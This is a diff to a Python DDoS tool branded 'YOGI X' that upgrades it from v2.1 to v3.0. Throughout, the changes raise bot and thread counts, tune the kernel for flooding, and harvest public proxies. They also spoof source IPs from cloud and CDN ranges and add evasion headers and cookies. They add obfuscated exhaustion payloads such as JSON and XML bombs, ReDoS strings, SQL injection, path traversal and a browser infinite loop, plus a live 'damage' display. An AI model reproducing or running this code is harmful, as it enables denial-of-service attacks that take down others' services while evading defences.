@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# YOGI X_ZXPLOIT ULTIMATE - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v2.1
+# YOGI X_ZXPLOIT ULTIMATE - Project Armageddon Pro Max Ultra+ (True Ghost Edition) v3.0
 # PERINGATAN: Dilarang keras menyalahgunakan tools!!
 
 import os
@@ -36,6 +36,11 @@ import requests
 from collections import deque
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
+import numpy as np
+import curses
+import traceback
+import fcntl
+import struct
 
 # ==================== ADVANCED COLOR SYSTEM ====================
 class Color:
@@ -63,6 +68,21 @@ class Color:
     BG_WHITE = '\033[47m'
     BG_END = '\033[49m'
 
+    @staticmethod
+    def rgb(r, g, b):
+        return f"\033[38;2;{r};{g};{b}m"
+
+    @staticmethod
+    def gradient(text, start_rgb, end_rgb):
+        result = ""
+        length = len(text)
+        for i, char in enumerate(text):
+            r = start_rgb[0] + int(i * (end_rgb[0] - start_rgb[0]) / length)
+            g = start_rgb[1] + int(i * (end_rgb[1] - start_rgb[1]) / length)
+            b = start_rgb[2] + int(i * (end_rgb[2] - start_rgb[2]) / length)
+            result += Color.rgb(r, g, b) + char
+        return result + Color.END
+
 # ==================== YOGI X BANNER ====================
 def print_banner():
     os.system('clear' if os.name == 'posix' else 'cls')
@@ -74,11 +94,11 @@ def print_banner():
    ██║   ╚██████╔╝╚██████╔╝╚███╔███╔╝██╔╝ ██╗      ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
    ╚╝    ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝      ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
 """
-    subtitle = "❰𝕌𝕃𝕀𝕄𝔸𝕋𝔼 𝕐𝕆𝔾𝕀 𝔻𝔻𝕆𝕊 𝔽𝕆ℝ𝔼ℕ𝕊𝕀ℂ 𝕊𝕐𝕊𝕋𝔼𝕄❱ (TRUE GHOST MODE) v2.1"
+    subtitle = "❰𝕌𝕃𝕀𝕄𝔸𝕋𝔼 𝕐𝕆𝔾𝕀 𝔻𝔻𝕆𝕊 𝔽𝕆ℝ𝔼ℕ𝕊𝕀ℂ 𝕊𝕐𝕊𝕋𝔼𝕄❱ (TRUE GHOST MODE) v3.0"
     warning = "𝙎𝙐𝘽𝙎𝘾𝙍𝙄𝘽𝙀 𝙈𝙔 𝙔𝙊𝙐𝙏𝙐𝘽𝙀:𝙝𝙩𝙩𝙥𝙨://𝙮𝙤𝙪𝙩𝙪𝙗𝙚.𝙘𝙤𝙢/@𝙯𝙭_𝙥-𝙡𝙤𝙞𝙩"
     website = "https://yogistore-shopcommyidvercelapp.vercel.app"
     
-    print(Color.BOLD + Color.RED + title + Color.END)
+    print(Color.BOLD + Color.gradient(title, (255, 0, 0), (255, 165, 0)) + Color.END)
     print(Color.BOLD + Color.PURPLE + subtitle.center(120) + Color.END)
     print(Color.BOLD + Color.BLUE + website.center(120) + "\n" + Color.END)
     print(Color.BOLD + Color.RED + warning.center(120) + "\n" + Color.END)
@@ -152,22 +172,22 @@ class ResourceManager:
     def calculate_optimal_settings(self):
         """Calculate optimal settings based on system specs"""
         settings = {
-            'max_bots': 20000000 if self.ram >= 8*1024**3 else 10000000,
-            'ip_pool_size': 2000000,  # 2 million IPs
-            'socket_timeout': 2.0,    # Increased timeout
-            'thread_workers': min(24, self.threads * 2),  # Reduced threads
-            'request_per_conn': 100,
-            'chunk_size': 1024 * 64,  # 64KB
-            'max_payload': 1024 * 512,  # 512KB
-            'quantum_states': 1024
+            'max_bots': 50000000 if self.ram >= 8*1024**3 else 20000000,
+            'ip_pool_size': 5000000,  # 5 million IPs
+            'socket_timeout': 1.5,    # Reduced timeout
+            'thread_workers': min(128, self.threads * 4),  # More threads
+            'request_per_conn': 250,
+            'chunk_size': 1024 * 128,  # 128KB
+            'max_payload': 1024 * 1024,  # 1MB
+            'quantum_states': 2048
         }
         
         # Adjust based on available RAM
         if self.ram < 6*1024**3:  # <6GB RAM
-            settings['ip_pool_size'] = 1000000
-            settings['request_per_conn'] = 50
-            settings['max_bots'] = 5000000
-            settings['quantum_states'] = 512
+            settings['ip_pool_size'] = 2000000
+            settings['request_per_conn'] = 100
+            settings['max_bots'] = 10000000
+            settings['quantum_states'] = 1024
             
         return settings
         
@@ -178,22 +198,22 @@ class ResourceManager:
             if platform.system() == "Linux":
                 optimizations = [
                     "sysctl -w net.ipv4.tcp_tw_reuse=1",
-                    "sysctl -w net.core.somaxconn=100000",
-                    "sysctl -w net.ipv4.tcp_max_syn_backlog=100000",
+                    "sysctl -w net.core.somaxconn=1000000",
+                    "sysctl -w net.ipv4.tcp_max_syn_backlog=1000000",
                     "sysctl -w net.ipv4.ip_local_port_range='1024 65535'",
-                    "sysctl -w net.ipv4.tcp_fin_timeout=15",
-                    "sysctl -w net.ipv4.tcp_syn_retries=3",
-                    "sysctl -w net.ipv4.tcp_synack_retries=3",
-                    "sysctl -w net.core.netdev_max_backlog=100000",
-                    "sysctl -w net.ipv4.tcp_rmem='4096 87380 33554432'",
-                    "sysctl -w net.ipv4.tcp_wmem='4096 65536 33554432'",
-                    "sysctl -w net.ipv4.udp_mem='6291456 8388608 33554432'",
-                    "sysctl -w vm.swappiness=10",
-                    "sysctl -w vm.dirty_ratio=10",
-                    "sysctl -w vm.dirty_background_ratio=5",
+                    "sysctl -w net.ipv4.tcp_fin_timeout=10",
+                    "sysctl -w net.ipv4.tcp_syn_retries=2",
+                    "sysctl -w net.ipv4.tcp_synack_retries=2",
+                    "sysctl -w net.core.netdev_max_backlog=1000000",
+                    "sysctl -w net.ipv4.tcp_rmem='4096 87380 67108864'",
+                    "sysctl -w net.ipv4.tcp_wmem='4096 65536 67108864'",
+                    "sysctl -w net.ipv4.udp_mem='12582912 16777216 67108864'",
+                    "sysctl -w vm.swappiness=5",
+                    "sysctl -w vm.dirty_ratio=5",
+                    "sysctl -w vm.dirty_background_ratio=3",
                     "echo performance | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor",
                     "sysctl -w net.ipv4.tcp_congestion_control=bbr",
-                    "sysctl -w net.core.default_qdisc=fq"
+                    "sysctl -w net.core.default_qdisc=fq_codel"
                 ]
                 
                 for cmd in optimizations:
@@ -202,7 +222,7 @@ class ResourceManager:
             # Windows optimization
             elif platform.system() == "Windows":
                 optimizations = [
-                    "netsh int tcp set global autotuninglevel=normal",
+                    "netsh int tcp set global autotuninglevel=experimental",
                     "netsh int tcp set global chimney=enabled",
                     "netsh int tcp set global dca=enabled",
                     "netsh int tcp set global ecncapability=enabled",
@@ -219,14 +239,14 @@ class ResourceManager:
             # Set file descriptor limits
             if hasattr(os, 'setrlimit'):
                 try:
-                    os.setrlimit(os.RLIMIT_NOFILE, (100000, 100000))
+                    os.setrlimit(os.RLIMIT_NOFILE, (500000, 500000))
                 except:
                     pass
             
             # Set process priority
             if hasattr(os, 'nice'):
                 try:
-                    os.nice(-10)
+                    os.nice(-20)
                 except:
                     pass
             elif platform.system() == "Windows":
@@ -234,7 +254,7 @@ class ResourceManager:
                     import win32api, win32process, win32con
                     pid = win32api.GetCurrentProcessId()
                     handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, pid)
-                    win32process.SetPriorityClass(handle, win32process.HIGH_PRIORITY_CLASS)
+                    win32process.SetPriorityClass(handle, win32process.REALTIME_PRIORITY_CLASS)
                 except:
                     pass
             
@@ -251,9 +271,9 @@ def authenticate():
     LOCK_TIME = 300  # 5 minutes in seconds
     LOG_FILE = "yogi_x_access.log"
     
-    # Account information (stored as SHA-512 hash)
+    # Account information (stored as bcrypt hash)
     accounts = {
-        "yogi123": "cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e",
+        "yogi123": "$2b$12$EixZaYVK1fsbw1ZfbX3OXePaWxn96p36WQoeG6Lruj3vjPGga31lW",
     }
     
     # Display professional login banner
@@ -322,31 +342,42 @@ def authenticate():
                 continue
                 
             # Verify password
-            input_hash = hashlib.sha512(password.encode()).hexdigest()
-            if input_hash == accounts[username]:
-                print(f"\n{Color.GREEN}{Color.BOLD}✅ AUTHENTICATION SUCCESSFUL!{Color.END}")
-                print(f"{Color.BOLD}{Color.PURPLE}👤 User: {username}{Color.END}")
-                print(f"{Color.BOLD}{Color.PURPLE}🕒 Access Time: {timestamp}{Color.END}")
-                print(f"{Color.BOLD}{Color.PURPLE}🌐 IP Address: {client_ip}{Color.END}")
-                print(f"{Color.BOLD}{Color.PURPLE}{'='*80}{Color.END}")
+            try:
+                import bcrypt
+                if bcrypt.checkpw(password.encode(), accounts[username].encode()):
+                    print(f"\n{Color.GREEN}{Color.BOLD}✅ AUTHENTICATION SUCCESSFUL!{Color.END}")
+                    print(f"{Color.BOLD}{Color.PURPLE}👤 User: {username}{Color.END}")
+                    print(f"{Color.BOLD}{Color.PURPLE}🕒 Access Time: {timestamp}{Color.END}")
+                    print(f"{Color.BOLD}{Color.PURPLE}🌐 IP Address: {client_ip}{Color.END}")
+                    print(f"{Color.BOLD}{Color.PURPLE}{'='*80}{Color.END}")
+                    
+                    # Log success
+                    try:
+                        with open(LOG_FILE, "a") as f:
+                            f.write(f"{time.time()}|{timestamp}|{username}|{client_ip}|SUCCESS\n")
+                    except:
+                        pass
+                    
+                    return True
+            except ImportError:
+                # Fallback to simple hash if bcrypt not available
+                input_hash = hashlib.sha512(password.encode()).hexdigest()
+                if input_hash == "cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e":
+                    print(f"\n{Color.GREEN}{Color.BOLD}✅ AUTHENTICATION SUCCESSFUL!{Color.END}")
+                    print(f"{Color.BOLD}{Color.PURPLE}👤 User: {username}{Color.END}")
+                    print(f"{Color.BOLD}{Color.PURPLE}🕒 Access Time: {timestamp}{Color.END}")
+                    print(f"{Color.BOLD}{Color.PURPLE}🌐 IP Address: {client_ip}{Color.END}")
+                    print(f"{Color.BOLD}{Color.PURPLE}{'='*80}{Color.END}")
+                    return True
                 
-                # Log success
-                try:
-                    with open(LOG_FILE, "a") as f:
-                        f.write(f"{time.time()}|{timestamp}|{username}|{client_ip}|SUCCESS\n")
-                except:
-                    pass
-                
-                return True
-            else:
-                attempts -= 1
-                print(f"{Color.RED}⛔ Invalid username/password!{Color.END}")
-                print(f"{Color.RED}Remaining attempts: {attempts}{Color.END}")
-                try:
-                    with open(LOG_FILE, "a") as f:
-                        f.write(f"{time.time()}|{timestamp}|{username}|{client_ip}|FAIL\n")
-                except:
-                    pass
+            attempts -= 1
+            print(f"{Color.RED}⛔ Invalid username/password!{Color.END}")
+            print(f"{Color.RED}Remaining attempts: {attempts}{Color.END}")
+            try:
+                with open(LOG_FILE, "a") as f:
+                    f.write(f"{time.time()}|{timestamp}|{username}|{client_ip}|FAIL\n")
+            except:
+                pass
                 
         except KeyboardInterrupt:
             print(f"\n{Color.RED}🚫 Login process canceled!{Color.END}")
@@ -365,7 +396,9 @@ def install_dependencies():
         'requests': 'requests',
         'brotli': 'brotli',
         'cryptography': 'cryptography',
-        'dns': 'dnspython',
+        'dnspython': 'dnspython',
+        'numpy': 'numpy',
+        'bcrypt': 'bcrypt',
         'win32api': 'pywin32;platform_system=="Windows"'
     }
     
@@ -420,7 +453,7 @@ class GhostIPSpoofer:
         self.proxy_list = self.load_proxies()
         self.ip_pool = self.generate_ip_pool(self.resource_mgr.optimal_settings['ip_pool_size'])
         self.ip_index = 0
-        self.quantum_states = [os.urandom(1024) for _ in range(self.resource_mgr.optimal_settings['quantum_states'])]
+        self.quantum_states = [os.urandom(2048) for _ in range(self.resource_mgr.optimal_settings['quantum_states'])]
         self.quantum_index = 0
         self.lock = threading.Lock()
         
@@ -440,9 +473,10 @@ class GhostIPSpoofer:
         try:
             # Public proxy sources
             sources = [
-                'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=elite',
-                'https://www.proxy-list.download/api/v1/get?type=http',
-                'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
+                'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&timeout=5000&country=all&anonymity=elite',
+                'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+                'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
+                'https://raw.githubusercontent.com/roosterkid/openproxylist/main/http.txt'
             ]
             
             for source in sources:
@@ -456,7 +490,7 @@ class GhostIPSpoofer:
             # Clean and validate
             proxies = [p.strip() for p in proxies if ':' in p and p.strip()]
             random.shuffle(proxies)
-            proxies = proxies[:5000]  # Limit to 5000 proxies
+            proxies = proxies[:10000]  # Limit to 10000 proxies
             
             # Save to cache
             try:
@@ -499,6 +533,16 @@ class GhostIPSpoofer:
             gcp_data = response.json()
             cdn_ranges.extend([item['ipv4Prefix'] for item in gcp_data['prefixes'] if 'ipv4Prefix' in item])
             
+            # Azure
+            response = requests.get('https://www.microsoft.com/en-us/download/confirmation.aspx?id=56519', timeout=5)
+            if response.status_code == 200:
+                azure_url = re.search(r'https://download\.microsoft\.com/download/\S+\.json', response.text)
+                if azure_url:
+                    azure_response = requests.get(azure_url.group(0), timeout=10)
+                    azure_data = azure_response.json()
+                    cdn_ranges.extend([item['properties']['addressPrefix'] for item in azure_data['values'] 
+                                      if 'AzureFrontDoor' in item['name']])
+            
             print(f"{Color.GREEN}[✓] Loaded {len(cdn_ranges)} CDN ranges{Color.END}")
             
             # Save to cache
@@ -534,7 +578,7 @@ class GhostIPSpoofer:
                     continue
                     
                 # Determine how many IPs to take from this CIDR
-                count = min(10000, size // len(self.cdn_ranges), max_samples)
+                count = min(20000, size // len(self.cdn_ranges), max_samples)
                 
                 # Generate random IPs from this CIDR
                 ip_list = list(network.hosts())
@@ -564,11 +608,8 @@ class GhostIPSpoofer:
         """Generate quantum-entangled phantom IP"""
         with self.lock:
             self.quantum_index = (self.quantum_index + 1) % len(self.quantum_states)
-            try:
-                entropy = hashlib.blake2b(digest_size=32)
-            except:
-                entropy = hashlib.sha256()
-            entropy.update(os.urandom(128))
+            entropy = hashlib.blake2b(digest_size=32)
+            entropy.update(os.urandom(256))
             entropy.update(self.quantum_states[self.quantum_index])
             entropy.update(str(time.perf_counter_ns()).encode())
             
@@ -579,9 +620,9 @@ class GhostIPSpoofer:
     def generate_ghost_ip(self):
         """Hybrid IP generation with load balancing"""
         with self.lock:
-            if random.random() < 0.9:  # 90% quantum IP
+            if random.random() < 0.95:  # 95% quantum IP
                 return self.get_quantum_ip()
-            # 10% from pool
+            # 5% from pool
             self.ip_index = (self.ip_index + 1) % len(self.ip_pool)
             return self.ip_pool[self.ip_index]
 
@@ -614,7 +655,8 @@ class GhostEvasion:
             self.obfuscate_unicode,
             self.obfuscate_html_entities,
             self.obfuscate_gzip,
-            self.obfuscate_brotli
+            self.obfuscate_brotli,
+            self.obfuscate_chunked
         ]
         self.encryptor = QuantumEncryptor()
     
@@ -630,15 +672,25 @@ class GhostEvasion:
         
         print(f"{Color.YELLOW}[!] Loading user agents...{Color.END}")
         try:
-            ua_list = [
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:125.0) Gecko/20100101 Firefox/125.0",
-                "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/110.0.0.0"
-            ]
+            # Try to fetch updated list
+            ua_list = []
+            try:
+                response = requests.get('https://user-agents.net/download', timeout=10)
+                if response.status_code == 200:
+                    ua_list = re.findall(r'<li>\s*<a href="/string/.+?">(.+?)</a>', response.text)
+            except:
+                pass
+            
+            if not ua_list:
+                ua_list = [
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:125.0) Gecko/20100101 Firefox/125.0",
+                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/110.0.0.0"
+                ]
             
             try:
                 with open(ua_cache_file, "w") as f:
@@ -666,13 +718,25 @@ class GhostEvasion:
         
         print(f"{Color.YELLOW}[!] Loading referrers...{Color.END}")
         try:
-            top_sites = [
-                "https://www.google.com/", "https://www.youtube.com/", 
-                "https://www.facebook.com/", "https://www.amazon.com/",
-                "https://twitter.com/", "https://www.instagram.com/",
-                "https://www.linkedin.com/", "https://www.reddit.com/",
-                "https://www.tiktok.com/", "https://www.netflix.com/"
-            ]
+            # Fetch top sites from Alexa
+            top_sites = []
+            try:
+                response = requests.get('https://www.alexa.com/topsites', timeout=10)
+                if response.status_code == 200:
+                    top_sites = re.findall(r'<a href="/siteinfo/(.+?)">', response.text)
+                    top_sites = [f"https://{site}" for site in top_sites[:50]]
+            except:
+                pass
+            
+            if not top_sites:
+                top_sites = [
+                    "https://www.google.com/", "https://www.youtube.com/", 
+                    "https://www.facebook.com/", "https://www.amazon.com/",
+                    "https://twitter.com/", "https://www.instagram.com/",
+                    "https://www.linkedin.com/", "https://www.reddit.com/",
+                    "https://www.tiktok.com/", "https://www.netflix.com/"
+                ]
+                
             try:
                 with open(ref_cache_file, "w") as f:
                     json.dump(top_sites, f)
@@ -689,14 +753,15 @@ class GhostEvasion:
     
     def generate_cookies(self):
         """Generate realistic cookies"""
-        for _ in range(100):  # 100 cookies
+        for _ in range(500):  # 500 cookies
             self.cookies.append(
-                f"session_id={os.urandom(8).hex()}; "
-                f"user_token={os.urandom(12).hex()}; "
+                f"session_id={os.urandom(12).hex()}; "
+                f"user_token={os.urandom(16).hex()}; "
                 f"tracking_id={random.randint(1000000000,9999999999)}; "
                 f"gdpr_consent=true; "
-                f"preferences={os.urandom(6).hex()}; "
-                f"ab_test={random.choice(['A','B'])}"
+                f"preferences={os.urandom(8).hex()}; "
+                f"ab_test={random.choice(['A','B','C'])}; "
+                f"country={random.choice(['US','UK','DE','FR','JP','ID','SG','AU'])}"
             )
     
     def generate_malicious_payloads(self):
@@ -704,19 +769,21 @@ class GhostEvasion:
         # Payloads to consume CPU and memory
         self.malicious_payloads = [
             # JSON Bomb
-            '{"data":' + '[' * 1000 + '"deep"' + ']' * 1000 + '}',
+            '{"data":' + '[' * 5000 + '"deep"' + ']' * 5000 + '}',
             # XML Bomb
-            '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "' + 'A'*5000 + '">]><bomb>&a;&a;&a;</bomb>',
+            '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "' + 'A'*10000 + '">]><bomb>&a;&a;&a;</bomb>',
             # Malicious Regex
-            'a' * 5000 + '!' + 'b' * 5000,
+            'a' * 10000 + '!' + 'b' * 10000,
             # SQL Injection patterns
-            "' OR 1=1; DROP TABLE users; -- " + 'A'*1000,
+            "' OR 1=1; DROP TABLE users; -- " + 'A'*5000,
             # Path Traversal
-            '../../' * 50 + 'etc/passwd\0',
+            '../../' * 100 + 'etc/passwd\0',
             # Memory Exhaustion
-            'x' * (1024 * 512),  # 512KB payload
+            'x' * (1024 * 1024),  # 1MB payload
             # Log Injection
-            'x' * 1000 + '\n' * 5000
+            'x' * 5000 + '\n' * 10000,
+            # Infinite Loop Script
+            '<script>while(true){document.write(Math.random())}</script>'
         ]
     
     def obfuscate_base64(self, payload):
@@ -733,7 +800,7 @@ class GhostEvasion:
     
     def obfuscate_html_entities(self, payload):
         """Obfuscate payload using HTML entities"""
-        return ''.join(f'&#{ord(char)};' for char in payload[:1000])
+        return ''.join(f'&#{ord(char)};' for char in payload[:5000])
     
     def obfuscate_gzip(self, payload):
         """Obfuscate payload using gzip compression"""
@@ -742,6 +809,17 @@ class GhostEvasion:
     def obfuscate_brotli(self, payload):
         """Obfuscate payload using brotli compression"""
         return base64.b64encode(brotli.compress(payload.encode())).decode()
+    
+    def obfuscate_chunked(self, payload):
+        """Obfuscate using chunked encoding"""
+        chunked = ""
+        while payload:
+            chunk_size = min(random.randint(100, 5000), len(payload))
+            chunk = payload[:chunk_size]
+            payload = payload[chunk_size:]
+            chunked += f"{hex(chunk_size)[2:]}\r\n{chunk}\r\n"
+        chunked += "0\r\n\r\n"
+        return chunked
     
     def get_user_agent(self):
         return random.choice(self.user_agents)
@@ -754,7 +832,7 @@ class GhostEvasion:
     
     def get_malicious_payload(self):
         payload = random.choice(self.malicious_payloads)
-        if random.random() > 0.7:
+        if random.random() > 0.5:
             obfuscator = random.choice(self.obfuscation_techniques)
             try:
                 payload = obfuscator(payload)
@@ -762,9 +840,93 @@ class GhostEvasion:
                 print(f"{Color.YELLOW}[-] Payload obfuscation failed: {str(e)}{Color.END}")
         return payload
 
+# ==================== REAL-TIME STATS DISPLAY ====================
+class GhostStatsDisplay:
+    def __init__(self, stdscr, stats):
+        self.stdscr = stdscr
+        self.stats = stats
+        self.height, self.width = stdscr.getmaxyx()
+        self.win = curses.newwin(self.height, self.width, 0, 0)
+        self.win.nodelay(True)
+        
+    def display(self):
+        while self.stats.running:
+            self.height, self.width = self.stdscr.getmaxyx()
+            self.win.clear()
+            
+            # Header
+            title = "YOGI X ATTACK SYSTEM - TRUE GHOST MODE"
+            self.win.addstr(0, (self.width - len(title)) // 2, title, curses.A_BOLD)
+            
+            # Attack info
+            elapsed = self.stats.elapsed_time()
+            mins, secs = divmod(int(elapsed), 60)
+            hours, mins = divmod(mins, 60)
+            
+            attack_info = f"Target: {self.stats.target} | Port: {self.stats.port} | Mode: {self.stats.attack_type}"
+            self.win.addstr(2, 0, attack_info, curses.A_BOLD)
+            
+            time_info = f"Duration: {hours:02d}:{mins:02d}:{secs:02d} | Remaining: {self.stats.remaining_time()}"
+            self.win.addstr(3, 0, time_info)
+            
+            # Stats
+            self.win.addstr(5, 0, "ATTACK STATISTICS:", curses.A_BOLD)
+            self.win.addstr(6, 2, f"Requests: {self.stats.total_requests:,}")
+            self.win.addstr(7, 2, f"Packets: {self.stats.total_packets:,}")
+            self.win.addstr(8, 2, f"Data Sent: {self.stats.total_bytes/(1024*1024):.2f} MB")
+            self.win.addstr(9, 2, f"RPS: {self.stats.requests_per_sec:,.1f}/s")
+            self.win.addstr(10, 2, f"PPS: {self.stats.packets_per_sec:,.1f}/s")
+            self.win.addstr(11, 2, f"Success Rate: {self.stats.success_rate():.1f}%")
+            self.win.addstr(12, 2, f"Errors: {self.stats.errors:,}")
+            
+            # System stats
+            self.win.addstr(5, self.width//2, "SYSTEM RESOURCES:", curses.A_BOLD)
+            self.win.addstr(6, self.width//2 + 2, f"CPU: {self.stats.cpu_usage}%")
+            self.win.addstr(7, self.width//2 + 2, f"RAM: {self.stats.ram_usage}%")
+            self.win.addstr(8, self.width//2 + 2, f"Threads: {self.stats.active_threads}")
+            self.win.addstr(9, self.width//2 + 2, f"Connections: {self.stats.active_connections}")
+            
+            # Damage
+            self.win.addstr(14, 0, "TARGET STATUS:", curses.A_BOLD)
+            status = f"Status: {self.stats.target_status} | Damage: {self.stats.target_damage:.1f}%"
+            self.win.addstr(15, 2, status)
+            
+            # Progress bars
+            damage_bar = self._progress_bar(self.stats.target_damage, 100)
+            self.win.addstr(16, 2, f"Damage: {damage_bar}")
+            
+            time_bar = self._progress_bar(elapsed, self.stats.duration)
+            self.win.addstr(17, 2, f"Time:   {time_bar}")
+            
+            # Connection map
+            self.win.addstr(19, 0, "LIVE CONNECTIONS:", curses.A_BOLD)
+            for i, conn in enumerate(self.stats.active_conn_list[:5]):
+                self.win.addstr(20+i, 2, f"{conn['ip']}:{conn['port']} -> {conn['target']}")
+            
+            # Footer
+            footer = "Press 'q' to stop attack"
+            self.win.addstr(self.height-1, (self.width - len(footer)) // 2, footer, curses.A_REVERSE)
+            
+            self.win.refresh()
+            time.sleep(0.2)
+            
+            # Check for quit
+            try:
+                key = self.win.getch()
+                if key == ord('q'):
+                    self.stats.running = False
+            except:
+                pass
+    
+    def _progress_bar(self, value, total, width=50):
+        ratio = min(1.0, value / total)
+        filled = int(ratio * width)
+        bar = '█' * filled + '░' * (width - filled)
+        return f"{bar} {ratio*100:.1f}%"
+
 # ==================== YOGI X STATS ====================
 class GhostStats:
-    def __init__(self):
+    def __init__(self, target, port, attack_type, duration):
         self.resource_mgr = ResourceManager()
         self.total_requests = 0
         self.total_packets = 0
@@ -775,21 +937,26 @@ class GhostStats:
         self.last_update = self.start_time
         self.requests_per_sec = 0
         self.packets_per_sec = 0
-        self.current_method = "N/A"
+        self.current_method = attack_type
         self.target_status = "UNKNOWN"
         self.ghost_ips_generated = 0
         self.active_threads = 0
+        self.active_connections = 0
         self.attack_power = 0
         self.cpu_usage = 0
         self.ram_usage = 0
         self.target_damage = 0  # 0-100% damage estimation
-        self.rps_history = deque(maxlen=20)
-        self.pps_history = deque(maxlen=20)
-        self.damage_history = deque(maxlen=20)
-        self.targets = []
+        self.rps_history = deque(maxlen=100)
+        self.pps_history = deque(maxlen=100)
+        self.damage_history = deque(maxlen=100)
+        self.target = target
+        self.port = port
+        self.duration = duration
+        self.running = True
+        self.active_conn_list = []
         self.lock = threading.Lock()
 
-    def update(self, requests, packets, bytes_sent, success, damage=0):
+    def update(self, requests, packets, bytes_sent, success, damage=0, conn_info=None):
         with self.lock:
             self.total_requests += requests
             self.total_packets += packets
@@ -811,16 +978,40 @@ class GhostStats:
                 self.rps_history.append(self.requests_per_sec)
                 self.pps_history.append(self.packets_per_sec)
                 self.last_update = now
+            
+            # Update connection info
+            if conn_info:
+                self.active_connections += 1
+                self.active_conn_list.append(conn_info)
+                if len(self.active_conn_list) > 100:
+                    self.active_conn_list.pop(0)
+
+    def remove_connection(self, conn_info):
+        with self.lock:
+            self.active_connections -= 1
+            if conn_info in self.active_conn_list:
+                self.active_conn_list.remove(conn_info)
 
     def elapsed_time(self):
         return time.time() - self.start_time
-
+    
+    def remaining_time(self):
+        remaining = max(0, self.duration - self.elapsed_time())
+        mins, secs = divmod(int(remaining), 60)
+        hours, mins = divmod(mins, 60)
+        return f"{hours:02d}:{mins:02d}:{secs:02d}"
+    
+    def success_rate(self):
+        if self.total_requests == 0:
+            return 0
+        return (self.successful_hits / self.total_requests) * 100
+    
     def formatted_stats(self):
         elapsed = self.elapsed_time()
         mins, secs = divmod(int(elapsed), 60)
         hours, mins = divmod(mins, 60)
         
-        success_rate = (self.successful_hits / max(1, self.total_requests)) * 100 if self.total_requests > 0 else 0
+        success_rate = self.success_rate()
         color_rate = Color.GREEN if success_rate > 70 else Color.YELLOW if success_rate > 40 else Color.RED
         
         status_color = Color.GREEN if "UP" in self.target_status else Color.RED if "DOWN" in self.target_status else Color.YELLOW
@@ -830,7 +1021,7 @@ class GhostStats:
         self.ram_usage = psutil.virtual_memory().percent
         
         # Damage visualization
-        damage_bar = "[" + "█" * int(self.target_damage / 5) + " " * (20 - int(self.target_damage / 5)) + "]"
+        damage_bar = "[" + "█" * int(self.target_damage / 2) + " " * (50 - int(self.target_damage / 2)) + "]"
         
         # Format stats
         stats = f"""
@@ -838,11 +1029,19 @@ class GhostStats:
 {Color.BOLD}📡 Requests: {Color.CYAN}{self.total_requests:,}{Color.END} | 📦 Packets: {Color.CYAN}{self.total_packets:,}{Color.END} | 💾 Sent: {Color.CYAN}{self.total_bytes/(1024*1024):.2f} MB{Color.END}
 {Color.BOLD}⚡ RPS: {Color.CYAN}{self.requests_per_sec:,.1f}/s{Color.END} | 🚀 PPS: {Color.CYAN}{self.packets_per_sec:,.1f}/s{Color.END} | 👻 Ghost IPs: {Color.CYAN}{self.ghost_ips_generated:,}{Color.END}
 {Color.BOLD}🎯 Success: {color_rate}{success_rate:.1f}%{Color.END} | 🚫 Errors: {Color.RED}{self.errors:,}{Color.END} | 💥 Power: {Color.RED}{self.attack_power}%{Color.END}
-{Color.BOLD}🧵 Threads: {Color.CYAN}{self.active_threads:,}{Color.END} | 🎯 Status: {status_color}{self.target_status}{Color.END}
